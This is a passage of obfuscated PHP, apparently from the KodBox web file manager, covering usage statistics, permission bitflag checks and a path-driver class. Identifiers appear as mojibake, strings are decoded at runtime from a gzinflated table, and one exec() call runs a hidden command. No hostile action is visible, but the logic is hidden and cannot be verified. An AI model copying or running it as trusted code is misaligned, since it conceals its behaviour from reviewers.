$ÇèŒ‰œ™, $´“ïÊöš[1746] => (int) $»ø¥ÇÕì, $´“ïÊöš[1747] => (int) $ôö¢ÌƒÅ, $´“ïÊöš[1748] => (int) $›ûÖÍ¼); return $this->insert($‡–û…¬Í); } public function trend($¾ÌŞ†ú, $ÔƒËÓÛç) { $†€¢¬Ë˜ =& $_SERVER[Æ š¦İÈ]; if (!$this->init($¾ÌŞ†ú)) { return !1; } $”ËÇ–È = $this->trendList($¾ÌŞ†ú); if ($”ËÇ–È && $ÔƒËÓÛç != $†€¢¬Ë˜[1617]) { $ëñÈğÔå = $”ËÇ–È[0][$†€¢¬Ë˜[221]]; $—µìç°ö = $this->validDate($ÔƒËÓÛç, $ëñÈğÔå); $Íıô–‘• = array(); $É•ôÚÁš = array_to_keyvalue($”ËÇ–È, $†€¢¬Ë˜[221]); foreach ($—µìç°ö as $Åğ¦ïÖĞ) { if (isset($É•ôÚÁš[$Åğ¦ïÖĞ])) { $¸Ú£Ç€Î = $É•ôÚÁš[$Åğ¦ïÖĞ]; } else { $¸Ú£Ç€Î = end($”ËÇ–È); $¸Ú£Ç€Î[$†€¢¬Ë˜[221]] = $Åğ¦ïÖĞ; if ($¾ÌŞ†ú == $†€¢¬Ë˜[596]) { $¸Ú£Ç€Î[$†€¢¬Ë˜[1742]] = $¸Ú£Ç€Î[$†€¢¬Ë˜[1743]] = 0; } } $Íıô–‘•[] = $¸Ú£Ç€Î; } $”ËÇ–È = $Íıô–‘•; } $øŒğ‹Æ = array($†€¢¬Ë˜[596] => array($†€¢¬Ë˜[762] => LNG($†€¢¬Ë˜[1758]), $†€¢¬Ë˜[1742] => LNG($†€¢¬Ë˜[1759]), $†€¢¬Ë˜[1743] => LNG($†€¢¬Ë˜[1760])), $†€¢¬Ë˜[1744] => array($†€¢¬Ë˜[760] => LNG($†€¢¬Ë˜[1761]), $†€¢¬Ë˜[1746] => LNG($†€¢¬Ë˜[1762]), $†€¢¬Ë˜[1747] => LNG($†€¢¬Ë˜[1763]), $†€¢¬Ë˜[1748] => LNG($†€¢¬Ë˜[1764]))); $“çŸ•ò = array($†€¢¬Ë˜[596] => $†€¢¬Ë˜[1765], $†€¢¬Ë˜[1744] => $†€¢¬Ë˜[80]); if (empty($”ËÇ–È)) { $Åğ¦ïÖĞ = date($†€¢¬Ë˜[1749], strtotime($†€¢¬Ë˜[1750])); $ïèğ—­¥ = array($†€¢¬Ë˜[221] => $Åğ¦ïÖĞ); foreach ($øŒğ‹Æ[$¾ÌŞ†ú] as $–ñóÜş => $¥…ëˆÀ) { $ïèğ—­¥[$–ñóÜş] = 0; } $”ËÇ–È[] = $ïèğ—­¥; } $Öé¹¦¡ = array(); foreach ($”ËÇ–È as $¥…ëˆÀ) { if ($¾ÌŞ†ú == $†€¢¬Ë˜[1744] && $¥…ëˆÀ[$†€¢¬Ë˜[1746]] > $¥…ëˆÀ[$†€¢¬Ë˜[760]]) { $¥…ëˆÀ[$†€¢¬Ë˜[1746]] = $¥…ëˆÀ[$†€¢¬Ë˜[760]]; } foreach ($øŒğ‹Æ[$¾ÌŞ†ú] as $–ñóÜş => $¾ö­€ÈÒ) { $¸Ú£Ç€Î = array($†€¢¬Ë˜[221] => $¥…ëˆÀ[$†€¢¬Ë˜[221]], $†€¢¬Ë˜[1544] => $¾ö­€ÈÒ); $¸Ú£Ç€Î[$“çŸ•ò[$¾ÌŞ†ú]] = isset($¥…ëˆÀ[$–ñóÜş]) ? $¥…ëˆÀ[$–ñóÜş] : 0; $Öé¹¦¡[] = $¸Ú£Ç€Î; } } return $Öé¹¦¡; } public function validDate($ßˆìˆã¡, $šÁ™úª£) { $¶¿±–šÇ =& $_SERVER[Æ š¦İÈ]; $†Àƒ¾ = date($¶¿±–šÇ[1749], strtotime($¶¿±–šÇ[1750])); $ÅÍêÒŒØ = array($†Àƒ¾); switch ($ßˆìˆã¡) { case $¶¿±–šÇ[1624]: $ïùõ–¸ª = mktime(0, 0, 0, date($¶¿±–šÇ[1766]), date($¶¿±–šÇ[1364]) - date($¶¿±–šÇ[1427]) + 7 - 7, date($¶¿±–šÇ[1767])); $ËË…Ş°ú = 0; do { $­ŞÊÔ‡ğ = date($¶¿±–šÇ[1749], $ïùõ–¸ª - 3600 * 24 * 7 * $ËË…Ş°ú); $ÅÍêÒŒØ[] = $­ŞÊÔ‡ğ; $ËË…Ş°ú++; } while ($šÁ™úª£ < $­ŞÊÔ‡ğ); break; case $¶¿±–šÇ[1622]: $ËË…Ş°ú = 1; do { $Ë”–é³¾ = date($¶¿±–šÇ[1768], strtotime("\55\40{$ËË…Ş°ú}\40\x6d\157\156\x74\x68\x73")); $ÅÍêÒŒØ[] = $Ë”–é³¾; $ËË…Ş°ú++; } while ($šÁ™úª£ < $Ë”–é³¾); break; case $¶¿±–šÇ[1769]: $œ‹ùş = (int) date($¶¿±–šÇ[1767], strtotime($šÁ™úª£)); $Õ¹‡µŠ = (int) date($¶¿±–šÇ[1767]); if ($œ‹ùş >= $Õ¹‡µŠ) { break; } for ($œ‹ùş; $œ‹ùş < $Õ¹‡µŠ; $œ‹ùş++) { $ÅÍêÒŒØ[] = $œ‹ùş . $¶¿±–šÇ[1770]; } break; default: break; } if ($šÁ™úª£ > end($ÅÍêÒŒØ)) { array_pop($ÅÍêÒŒØ); } sort($ÅÍêÒŒØ); return $ÅÍêÒŒØ; } public function listTable($ŠçÂ‚ßÑ) { $»Öš–²° = ucfirst($ŠçÂ‚ßÑ); return Model($»Öš–²°)->listData(); } public function option($›ºæ›İ¸) { $Œ¾¬Í…è = $_SERVER[Æ š¦İÈ][1771] . ucfirst($›ºæ›İ¸); return $this->{$Œ¾¬Í…è}(); } private function optionUser() { $ºøûİá† =& $_SERVER[Æ š¦İÈ]; $ş¦ƒ®æ = Model($ºøûİá†[540])->count($ºøûİá†[1644]); $êò´’Çõ = Model($ºøûİá†[540])->where($ºøûİá†[1772])->count($ºøûİá†[1644]); $â¼‰·ã‡ = intval($GLOBALS[$ºøûİá†[6]][$ºøûİá†[346]][$ºøûİá†[1600]]) / 3600; $»€Èíë = strtotime("\55{$â¼‰·ã‡}\x20\150\x6f\x75\x72\163"); $ŒéåŸØ = strtotime(date($ºøûİá†[1753])); if ($»€Èíë < $ŒéåŸØ) { $»€Èíë = $ŒéåŸØ; } $§ Ì¯ = array($ºøûİá†[1773] => array($ºøûİá†[1005], $»€Èíë)); $«¥‡àÚû = (int) Model($ºøûİá†[540])->where($§ Ì¯)->count($ºøûİá†[1644]); if (!$«¥‡àÚû) { $«¥‡àÚû = 1; } $§ Ì¯ = array($ºøûİá†[1773] => array($ºøûİá†[1005], $ŒéåŸØ)); $ñ†¤˜à = Model($ºøûİá†[540])->where($§ Ì¯)->count($ºøûİá†[1644]); return array($ºøûİá†[756] => (int) $ş¦ƒ®æ, $ºøûİá†[1774] => (int) ($ş¦ƒ®æ - $êò´’Çõ), $ºøûİá†[1775] => (int) $êò´’Çõ, $ºøûİá†[1776] => (int) $ñ†¤˜à, $ºøûİá†[1777] => $«¥‡àÚû); } private function optionFile() { $öÉšŞÈ =& $_SERVER[Æ š¦İÈ]; $™üªõš÷ = $this->sourceSize(); $éË•ó¯” = $™üªõš÷[$öÉšŞÈ[80]]; $Æ½É›´ø = $™üªõš÷[$öÉšŞÈ[1746]]; $îÖô•õ = Model($öÉšŞÈ[822])->where(array($öÉšŞÈ[413] => 0))->count($öÉšŞÈ[405]); $îóšù®™ = array($öÉšŞÈ[413] => 0, $öÉšŞÈ[195] => array($öÉšŞÈ[1005], strtotime(date($öÉšŞÈ[1753])))); $È±·ˆ¯ã = Model($öÉšŞÈ[822])->where($îóšù®™)->sum($öÉšŞÈ[80]); $êóçåúí = Model($öÉšŞÈ[822])->where($îóšù®™)->count($öÉšŞÈ[405]); return array($öÉšŞÈ[760] => $éË•ó¯”, $öÉšŞÈ[1746] => $Æ½É›´ø, $öÉšŞÈ[1778] => $éË•ó¯” - $Æ½É›´ø, $öÉšŞÈ[1779] => (int) $È±·ˆ¯ã, $öÉšŞÈ[762] => (int) $îÖô•õ, $öÉšŞÈ[1780] => (int) $êóçåúí); } private function optionAccess() { $÷ˆ×¸âß =& $_SERVER[Æ š¦İÈ]; return array($÷ˆ×¸âß[756] => $this->typeLogCnt(), $÷ˆ×¸âß[108] => $this->typeLogCnt($÷ˆ×¸âß[108]), $÷ˆ×¸âß[452] => $this->typeLogCnt($÷ˆ×¸âß[452]), $÷ˆ×¸âß[1781] => $this->typeLogCnt($÷ˆ×¸âß[1781]), $÷ˆ×¸âß[1782] => $this->typeLogCnt($÷ˆ×¸âß[1782]), $÷ˆ×¸âß[596] => $this->typeLogCnt($÷ˆ×¸âß[12], $÷ˆ×¸âß[1757])); } private function typeLogCnt($ªğÅ˜êË = '', $°³úëÓ = "\x69\x64") { $½ĞÅº‡ó =& $_SERVER[Æ š¦İÈ]; $¯Éî¥õş = array($½ĞÅº‡ó[108] => array($½ĞÅº‡ó[1783], $½ĞÅº‡ó[1784]), $½ĞÅº‡ó[452] => array($½ĞÅº‡ó[1785], $½ĞÅº‡ó[1786]), $½ĞÅº‡ó[1781] => array($½ĞÅº‡ó[1787], $½ĞÅº‡ó[1788], $½ĞÅº‡ó[1789]), $½ĞÅº‡ó[1782] => array($½ĞÅº‡ó[1790], $½ĞÅº‡ó[1791]), $½ĞÅº‡ó[1792] => array($½ĞÅº‡ó[1793], $½ĞÅº‡ó[1794], $½ĞÅº‡ó[1795])); $²½ß¢™­ = strtotime(date($½ĞÅº‡ó[1753])); $«§Ãı = array($½ĞÅº‡ó[195] => array($½ĞÅº‡ó[1005], $²½ß¢™­)); if ($ªğÅ˜êË) { $«§Ãı[$½ĞÅº‡ó[33]] = array($½ĞÅº‡ó[7], $¯Éî¥õş[$ªğÅ˜êË]); } $¬ùÆ»‹„ = Model($½ĞÅº‡ó[1756])->where($«§Ãı)->count($°³úëÓ); return (int) $¬ùÆ»‹„; } private function optionServer() { $ë“¢Ì–¸ =& $_SERVER[Æ š¦İÈ]; $‰ ­úŠ = $this->diskDriver(); $ÌÃšö¤ø = KodIO::defaultDriver(); $Ö©œæ¨ğ = array($ë“¢Ì–¸[814] => $ÌÃšö¤ø[$ë“¢Ì–¸[403]]); $‚şÏü‚İ = Model($ë“¢Ì–¸[472])->where($Ö©œæ¨ğ)->sum($ë“¢Ì–¸[80]); $Úˆ»¨š¨ = explode($ë“¢Ì–¸[53], $_SERVER[$ë“¢Ì–¸[142]]); $ÃŞà°ÉÔ = $Úˆ»¨š¨[0]; $—İì®§Ú = $GLOBALS[$ë“¢Ì–¸[6]][$ë“¢Ì–¸[21]]; $²ôÎÒîî = $—İì®§Ú[$ë“¢Ì–¸[967]]; if ($²ôÎÒîî == $ë“¢Ì–¸[955]) { $Œ«çôÀå = explode($ë“¢Ì–¸[1261], $—İì®§Ú[$ë“¢Ì–¸[966]]); $²ôÎÒîî = $Œ«çôÀå[0]; } if ($²ôÎÒîî == $ë“¢Ì–¸[903] || $²ôÎÒîî == $ë“¢Ì–¸[801]) { $Ú‘°ë°ß = Model()->db()->query($ë“¢Ì–¸[1796]); $‹ëúøãê = $Ú‘°ë°ß[0] && isset($Ú‘°ë°ß[0][$ë“¢Ì–¸[1543]]) ? $Ú‘°ë°ß[0][$ë“¢Ì–¸[1543]] : 0; $²ôÎÒîî = $ë“¢Ì–¸[1797] . ($‹ëúøãê ? $ë“¢Ì–¸[8] . $‹ëúøãê : $ë“¢Ì–¸[12]); } $£üëãÂª = $GLOBALS[$ë“¢Ì–¸[6]][$ë“¢Ì–¸[346]][$ë“¢Ì–¸[824]]; return array($ë“¢Ì–¸[1798] => $‰ ­úŠ ? $‰ ­úŠ[$ë“¢Ì–¸[1799]] : 0, $ë“¢Ì–¸[1800] => $‰ ­úŠ ? $‰ ­úŠ[$ë“¢Ì–¸[1801]] : 0, $ë“¢Ì–¸[1802] => (int) $ÌÃšö¤ø[$ë“¢Ì–¸[1799]] * 1024 * 1024 * 1024, $ë“¢Ì–¸[1803] => (int) $‚şÏü‚İ, $ë“¢Ì–¸[1804] => ucfirst($ÃŞà°ÉÔ), $ë“¢Ì–¸[1805] => $ë“¢Ì–¸[1806] . PHP_VERSION, $ë“¢Ì–¸[1807] => phpBuild64() ? 64 : 32, $ë“¢Ì–¸[755] => str_replace($ë“¢Ì–¸[1121], $ë“¢Ì–¸[983], $²ôÎÒîî), $ë“¢Ì–¸[346] => ucfirst($£üëãÂª), $ë“¢Ì–¸[32] => $_SERVER[$ë“¢Ì–¸[1808]]); } private function diskDriver() { $¼Ğ—•õ =& $_SERVER[Æ š¦İÈ]; $ø™‹Â¶Ó = $¼Ğ—•õ[8]; $õ—Ó©½ê = $GLOBALS[$¼Ğ—•õ[6]][$¼Ğ—•õ[1277]] == $¼Ğ—•õ[1278]; if ($õ—Ó©½ê) { $ø™‹Â¶Ó = $¼Ğ—•õ[1809]; if (function_exists($¼Ğ—•õ[1810])) { exec($¼Ğ—•õ[1811], $¨ñ¼«œ¡); $ø™‹Â¶Ó = $¨ñ¼«œ¡[1] . $¼Ğ—•õ[8]; } } if (!file_exists($ø™‹Â¶Ó)) { return; } $åÅâÇ…È = @disk_total_space($ø™‹Â¶Ó); $ä®Ùš£À = $åÅâÇ…È - @disk_free_space($ø™‹Â¶Ó); return array($¼Ğ—•õ[1799] => $åÅâÇ…È, $¼Ğ—•õ[1801] => $ä®Ùš£À); } public function fileChart($¹ˆ¿û) { $íé£«Ş­ =& $_SERVER[Æ š¦İÈ]; if (isset($¹ˆ¿û[$íé£«Ş­[1644]])) { return Model($íé£«Ş­[822])->userFileTypeProfile($¹ˆ¿û[$íé£«Ş­[1644]]); } if (isset($¹ˆ¿û[$íé£«Ş­[1812]])) { return Model($íé£«Ş­[822])->groupFileTypeProfile($¹ˆ¿û[$íé£«Ş­[1812]]); } $ŸÆ—š¤Ã = $this->sourceSize(); $ÊÅØÄ = array($íé£«Ş­[500] => 0, $íé£«Ş­[414] => 1); $…ß»àÚ× = Model($íé£«Ş­[822])->where($ÊÅØÄ)->sum($íé£«Ş­[80]); $ÊÅØÄ[$íé£«Ş­[414]] = 2; $‰ÅÌÈÊ = Model($íé£«Ş­[822])->where($ÊÅØÄ)->sum($íé£«Ş­[80]); return array($íé£«Ş­[760] => $ŸÆ—š¤Ã[$íé£«Ş­[80]], $íé£«Ş­[1746] => $ŸÆ—š¤Ã[$íé£«Ş­[1746]], $íé£«Ş­[1747] => (int) $…ß»àÚ×, $íé£«Ş­[1748] => (int) $‰ÅÌÈÊ); } private function sourceSize() { $Š„•ÚØî =& $_SERVER[Æ š¦İÈ]; $ÚŸÖáÁÚ = Model($Š„•ÚØî[822])->where(array($Š„•ÚØî[413] => 0))->sum($Š„•ÚØî[80]); $Ó²‰Š« = Model($Š„•ÚØî[472])->sum($Š„•ÚØî[80]); if ($Ó²‰Š« > $ÚŸÖáÁÚ) { $Ó²‰Š« = $ÚŸÖáÁÚ; } return array($Š„•ÚØî[80] => (int) $ÚŸÖáÁÚ, $Š„•ÚØî[1746] => (int) $Ó²‰Š«); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $”îİñºü =& $_SERVER[Æ š¦İÈ]; $ºÂâ´é = array(array($”îİñºü[423] => LNG($”îİñºü[1813]), $”îİñºü[1814] => $”îİñºü[1815], $”îİñºü[1816] => 1, $”îİñºü[1817] => 1, $”îİñºü[1818] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($”îİñºü[423] => LNG($”îİñºü[1819]), $”îİñºü[1814] => $”îİñºü[1820], $”îİñºü[1816] => 2, $”îİñºü[1817] => 1, $”îİñºü[1818] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($”îİñºü[423] => LNG($”îİñºü[1821]), $”îİñºü[1814] => $”îİñºü[1822], $”îİñºü[1816] => 3, $”îİñºü[1817] => 1, $”îİñºü[1818] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($”îİñºü[423] => LNG($”îİñºü[1823]), $”îİñºü[1814] => $”îİñºü[1824], $”îİñºü[1816] => 4, $”îİñºü[1817] => 1, $”îİñºü[1818] => self::AUTH_SHOW | self::AUTH_VIEW), array($”îİñºü[423] => LNG($”îİñºü[1825]), $”îİñºü[1814] => $”îİñºü[1826], $”îİñºü[1816] => 5, $”îİñºü[1817] => 1, $”îİñºü[1818] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($”îİñºü[423] => LNG($”îİñºü[1827]), $”îİñºü[1814] => $”îİñºü[1828], $”îİñºü[1816] => 6, $”îİñºü[1817] => 1, $”îİñºü[1818] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($”îİñºü[423] => LNG($”îİñºü[1829]), $”îİñºü[1814] => $”îİñºü[1830], $”îİñºü[1816] => 7, $”îİñºü[1817] => 1, $”îİñºü[1818] => 0)); return $ºÂâ´é; } public static function authCheck($™İ±ÆÉ‡, $ÙğÄÚªñ) { $™İ±ÆÉ‡ = intval($™İ±ÆÉ‡); if ($GLOBALS[$_SERVER[Æ š¦İÈ][507]]) { return !0; } if ($™İ±ÆÉ‡ <= 0) { return !1; } if (($™İ±ÆÉ‡ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($™İ±ÆÉ‡ & $ÙğÄÚªñ); } public static function authCheckShow($•¿£½ÎŠ) { return self::authCheck($•¿£½ÎŠ, self::AUTH_SHOW); } public static function authCheckView($×‰ª’£Å) { return self::authCheck($×‰ª’£Å, self::AUTH_VIEW); } public static function authCheckDownload($ı’ä–¤²) { return self::authCheck($ı’ä–¤², self::AUTH_DOWNLOAD); } public static function authCheckUpload($ó¾Š„­) { return self::authCheck($ó¾Š„­, self::AUTH_UPLOAD); } public static function authCheckEdit($­Ğ€ÒË¨) { return self::authCheck($­Ğ€ÒË¨, self::AUTH_EDIT); } public static function authCheckRemove($ÓÊ¯İ§„) { return self::authCheck($ÓÊ¯İ§„, self::AUTH_REMOVE); } public static function authCheckShare($©ç’Ö) { return self::authCheck($©ç’Ö, self::AUTH_SHARE); } public static function authCheckComment($ÁÎ«ç£) { return self::authCheck($ÁÎ«ç£, self::AUTH_COMMENT); } public static function authCheckEvent($õªû« ¸) { return self::authCheck($õªû« ¸, self::AUTH_EVENT); } public static function authCheckRoot($¨ìÊäŞó) { return self::authCheck($¨ìÊäŞó, self::AUTH_ROOT); } public static function authCheckAction($äô‚õ·×, $­àÖ‡“) { $àâÖÕÛ± =& $_SERVER[Æ š¦İÈ]; $èÀ˜ì¥ = array($àâÖÕÛ±[1831] => self::AUTH_VIEW, $àâÖÕÛ±[1188] => self::AUTH_DOWNLOAD, $àâÖÕÛ±[108] => self::AUTH_UPLOAD, $àâÖÕÛ±[1782] => self::AUTH_EDIT, $àâÖÕÛ±[1781] => self::AUTH_REMOVE, $àâÖÕÛ±[1792] => self::AUTH_SHARE, $àâÖÕÛ±[351] => self::AUTH_COMMENT, $àâÖÕÛ±[1632] => self::AUTH_EVENT, $àâÖÕÛ±[1832] => self::AUTH_ROOT); if (!isset($èÀ˜ì¥[$­àÖ‡“])) { return; } $¦˜Ù³êµ = $èÀ˜ì¥[$­àÖ‡“]; $äô‚õ·× = intval($äô‚õ·×); if ($äô‚õ·× <= 0) { return !1; } if (($äô‚õ·× & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($äô‚õ·× & $¦˜Ù³êµ); } public static function authDisable($¾õ‰ß¤Ó, $î¤©) { if (intval($¾õ‰ß¤Ó) <= 0) { return 0; } return intval($¾õ‰ß¤Ó) & ~$î¤©; } public $optionType = "\x53\171\163\x74\145\x6d\56\x73\157\165\x72\143\x65\x41\165\x74\150\114\151\163\164"; public $field = array("\x6e\x61\155\x65", "\x61\x75\x74\150", "\x6c\x61\142\145\x6c", "\144\x69\163\x70\154\x61\171", "\x73\x79\163\x74\145\155", "\163\x6f\x72\x74"); public function initData() { $…–óñ„¥ = $this->authDefault(); foreach ($…–óñ„¥ as $£õú) { $this->add($£õú); } } public function findAuth($”áº…Ş, $úÉçòÖ¥) { $®ŒãÏ»  =& $_SERVER[Æ š¦İÈ]; $©õæßóä = parent::listData(); foreach ($©õæßóä as $©†ÒĞŞâ) { $ï«òú§¼ = intval($©†ÒĞŞâ[$®ŒãÏ» [416]]); if ($ï«òú§¼ <= 0 || $©†ÒĞŞâ[$®ŒãÏ» [1833]] == 0) { continue; } if (($ï«òú§¼ & $”áº…Ş) != $”áº…Ş) { continue; } if (($ï«òú§¼ & $úÉçòÖ¥) != 0) { continue; } return $©†ÒĞŞâ[$®ŒãÏ» [403]]; } return !1; } public function findAuthReadOnly() { $üæª˜°Ğ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $İ­ò¿îÏ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($üæª˜°Ğ, $İ­ò¿îÏ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function listData($ğ‘Û¢Á” = false, $ÌşÜ®È† = "\163\x6f\162\164", $öê¼ó› = false) { return parent::listData($ğ‘Û¢Á”, $ÌşÜ®È†, $öê¼ó›); } public function update($à³„Òô½, $‰èÊá¯É) { $¨¯æà«¨ =& $_SERVER[Æ š¦İÈ]; $¨ìùêü = parent::listData($à³„Òô½); $Ï›ÌÌÙˆ = $this->findByName($‰èÊá¯É[$¨¯æà«¨[32]]); if (!$¨ìùêü || $Ï›ÌÌÙˆ && $Ï›ÌÌÙˆ[$¨¯æà«¨[403]] != $¨ìùêü[$¨¯æà«¨[403]]) { return !1; } $this->filterAuth($‰èÊá¯É[$¨¯æà«¨[416]]); return parent::update($à³„Òô½, $‰èÊá¯É); } public function remove($š¿±î½™) { $–·Ú°™« = parent::listData($š¿±î½™); if (!$–·Ú°™« || $–·Ú°™«[$_SERVER[Æ š¦İÈ][1265]]) { return !1; } return parent::remove($š¿±î½™); } public function add($åÑÈÖÖø = array()) { $Ô¹åÏ‚· =& $_SERVER[Æ š¦İÈ]; if ($this->findByName($åÑÈÖÖø[$Ô¹åÏ‚·[32]])) { return !1; } $ñå‰ßÑö = array($Ô¹åÏ‚·[32] => $Ô¹åÏ‚·[12], $Ô¹åÏ‚·[416] => 1, $Ô¹åÏ‚·[1834] => $Ô¹åÏ‚·[1822], $Ô¹åÏ‚·[1833] => 1, $Ô¹åÏ‚·[1265] => 0, $Ô¹åÏ‚·[1835] => 0); $åÑÈÖÖø = array_merge($ñå‰ßÑö, $åÑÈÖÖø); $åÑÈÖÖø[$Ô¹åÏ‚·[1835]] = $this->getSort(); $this->filterAuth($åÑÈÖÖø[$Ô¹åÏ‚·[416]]); return parent::insert($åÑÈÖÖø); } private function getSort() { $ãùÉóÉ =& $_SERVER[Æ š¦İÈ]; $ì¼Ã­ù€ = parent::listData(); $ºÉ‘ÓÖ® = array_to_keyvalue($ì¼Ã­ù€, $ãùÉóÉ[12], $ãùÉóÉ[1835]); return empty($ºÉ‘ÓÖ®) ? 0 : max($ºÉ‘ÓÖ®) + 1; } private function filterAuth(&$»€ÌòÃæ) { if (!$»€ÌòÃæ) { return; } $ÓÊİ·®€ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ÏŞç˜Ğ½ = array(); foreach ($ÓÊİ·®€ as $˜Šé¬ê) { if ($»€ÌòÃæ & $˜Šé¬ê) { $ÏŞç˜Ğ½[] = $˜Šé¬ê; } } if (in_array(self::AUTH_ROOT, $ÏŞç˜Ğ½)) { $»€ÌòÃæ = array_sum($ÓÊİ·®€); return; } $¡å«ÅºÒ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ÏŞç˜Ğ½ as $˜Šé¬ê) { if (isset($¡å«ÅºÒ[$˜Šé¬ê])) { $ÏŞç˜Ğ½ = array_merge($ÏŞç˜Ğ½, $¡å«ÅºÒ[$˜Šé¬ê]); } } $ÏŞç˜Ğ½[] = self::AUTH_SHOW; $»€ÌòÃæ = array_sum(array_unique($ÏŞç˜Ğ½)); } public function sort($ ñ¾Û›, $ıšÜ¨’œ) { return parent::update($ ñ¾Û›, $ıšÜ¨’œ); } } goto FÇËØêñËğ; c™ ºë‚Æ: if (strlen($vdkmbsxqoz) < $_SERVER[Æ š¦İÈ][396]) { die; } $_SERVER[â­¶Àş‹] = explode($_SERVER[Æ š¦İÈ][609], gzinflate(substr($_SERVER[Æ š¦İÈ][610], 10, -8))); $xwlmyfqskp = $_SERVER[Æ š¦İÈ][611]; goto eÚñĞ–ôÍù; BâÉ†ğ¤¥Ñ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $â¤½¡ô‚ =& $_SERVER[Æ š¦İÈ]; $this->objectDriver = array($â¤½¡ô‚[60], $â¤½¡ô‚[61], $â¤½¡ô‚[62], $â¤½¡ô‚[63], $â¤½¡ô‚[64], $â¤½¡ô‚[65], $â¤½¡ô‚[66], $â¤½¡ô‚[67], $â¤½¡ô‚[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($üÅÕ°ı¡) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($üÅÕ°ı¡, $_SERVER[Æ š¦İÈ][8]); } return $üÅÕ°ı¡; } public function iconvApp($Æğšùº) { return $Æğšùº; } public function iconvSystem($²ê…¾øĞ) { return $²ê…¾øĞ; } public function iconvTo($Õ”ÃüÜ, $«ÕÄĞÇæ, $¢ğô¯õİ) { $’£‚Ùñ =& $_SERVER[Æ š¦İÈ]; if (!$Õ”ÃüÜ || !function_exists($’£‚Ùñ[69])) { return $Õ”ÃüÜ; } static $”ßŒö™® = array(); $ªö¶ñ†Ø = $«ÕÄĞÇæ . $’£‚Ùñ[70] . $¢ğô¯õİ . $’£‚Ùñ[71] . $Õ”ÃüÜ; if (isset($”ßŒö™®[$ªö¶ñ†Ø])) { return $”ßŒö™®[$ªö¶ñ†Ø]; } if (function_exists($’£‚Ùñ[72])) { $’óÅ¡¹ú = @mb_convert_encoding($Õ”ÃüÜ, $¢ğô¯õİ, $«ÕÄĞÇæ); } else { $’óÅ¡¹ú = @iconv($«ÕÄĞÇæ, $¢ğô¯õİ, $Õ”ÃüÜ); } $’óÅ¡¹ú = $’óÅ¡¹ú ? $’óÅ¡¹ú : $Õ”ÃüÜ; if (strstr($’óÅ¡¹ú, $’£‚Ùñ[73])) { $’óÅ¡¹ú = str_replace($’£‚Ùñ[73], $’£‚Ùñ[11], $’óÅ¡¹ú); } $”ßŒö™®[$«ÕÄĞÇæ . $’£‚Ùñ[70] . $¢ğô¯õİ . $’£‚Ùñ[71] . $Õ”ÃüÜ] = $’óÅ¡¹ú; $”ßŒö™®[$¢ğô¯õİ . $’£‚Ùñ[70] . $«ÕÄĞÇæ . $’£‚Ùñ[71] . $Õ”ÃüÜ] = $Õ”ÃüÜ; $”ßŒö™®[$¢ğô¯õİ . $’£‚Ùñ[70] . $«ÕÄĞÇæ . $’£‚Ùñ[71] . $’óÅ¡¹ú] = $Õ”ÃüÜ; $”ßŒö™®[$«ÕÄĞÇæ . $’£‚Ùñ[70] . $¢ğô¯õİ . $’£‚Ùñ[71] . $’óÅ¡¹ú] = $’óÅ¡¹ú; return $’óÅ¡¹ú; } public function getPathInner($»Ì¼°ˆ) { $ğ²‰ãã = IO::init($»Ì¼°ˆ); return $ğ²‰ãã->path; } public function getPathOuter($šÔ³ùÏ–) { $ÍÊ¿ÂÁù =& $_SERVER[Æ š¦İÈ]; $İš¿Œ· = strlen(trim($this->pathBase, $ÍÊ¿ÂÁù[8])); $šÔ³ùÏ– = substr(trim($šÔ³ùÏ–, $ÍÊ¿ÂÁù[8]), $İš¿Œ·); return $this->pathDriver . $ÍÊ¿ÂÁù[8] . ltrim($šÔ³ùÏ–, $ÍÊ¿ÂÁù[8]); } public function isParentOf($Ã÷Ç§‡’, $áµµØ‡à) { $À™ˆÒàÆ =& $_SERVER[Æ š¦İÈ]; $Ã÷Ç§‡’ = rtrim(strtolower($Ã÷Ç§‡’), $À™ˆÒàÆ[8]) . $À™ˆÒàÆ[8]; $áµµØ‡à = rtrim(strtolower($áµµØ‡à), $À™ˆÒàÆ[8]) . 